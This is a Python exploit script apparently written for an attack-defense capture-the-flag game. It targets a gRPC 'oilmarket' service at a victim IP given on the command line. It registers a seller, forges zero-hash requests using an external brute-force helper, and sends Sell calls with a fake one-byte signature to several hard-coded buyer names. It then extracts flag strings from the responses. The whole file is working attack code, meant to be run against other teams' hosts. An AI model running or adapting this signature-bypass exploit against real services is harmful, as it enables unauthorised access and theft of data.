#!/usr/bin/env python3

import grpc
from oilmarket_pb2 import *
from oilmarket_pb2_grpc import OilmarketStub

# USAGE:
# 1. Execute command: python3 -m grpc_tools.protoc -I path/to/proto_dir --python_out=. --pyi_out=. --grpc_python_out=. path/to/proto_dir/oilmarket.proto
# It creates:
    # - <service-name>_pb2.py
    # - <service-name>_pb2.pyi          here are params for RegisterRequest
    # - <service-name>_pb2_grpc.py      here are OilmarketStub, Register and RegisterRequest

# 2. Imports with <service-name>Stub:

import random
import string
import re
import sys
import json
import subprocess

port = 2112
flag_regexp = re.compile(r'[A-Z0-9]{31}=')


class Hacker:
    def __init__(self, ip):

        # gRPC vars
        self.insecure_channel = grpc.insecure_channel(f"{ip}:{port}")
        self.stube = OilmarketStub(self.insecure_channel)

        # User vars
        random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.name = random_string
        self.seller_api_key = ""


    def create_seller(self):
        resp = self.stube.CreateSeller(CreateSellerRequest(
                name = self.name
        ))
        self.seller_api_key = resp.api_key
        return resp


    def add_barrel(self):
        resp = self.stube.AddBarrel(AddBarrelRequest(
                api_key = self.seller_api_key
        ))
        return resp


    def sell(self, buyer_name, attester_name, request):
        resp = self.stube.Sell(SellRequest(
                api_key = self.seller_api_key,
                buyer = buyer_name,
                attester = attester_name,
                request = request,
                signature = b'\x00'
        ))
        return resp


    def find_flags(self, text: str):
        print( flag_regexp.findall(text), flush=True )
        
    
def main():

    try:
        ip = sys.argv[1]
    except:
        print(f"USAGE:\t{sys.argv[0]} <victim-ip-address>")
        sys.exit(1)

    ip = sys.argv[1]

    HINTs = [
        "NdGNHJo4",
        "oEVJvjy8",
        "LLqXbuoy",
        "S6PdBl6w",
        "HGxTpW3W"
    ]

    hasher = Hacker(ip)
    hasher.create_seller()
    for name in HINTs:

        barrel_id = hasher.add_barrel().id
        # print( f"Barrel ID: {barrel_id}" )

        request = subprocess.check_output(["../brute_hash", str(barrel_id)])
        # print( f"Request with 0-hash: {request}" )
        
        try:
            selled = hasher.sell(name , name, request)
            hasher.find_flags( str(selled) )
        except: pass


if __name__ == "__main__":  
    main()
        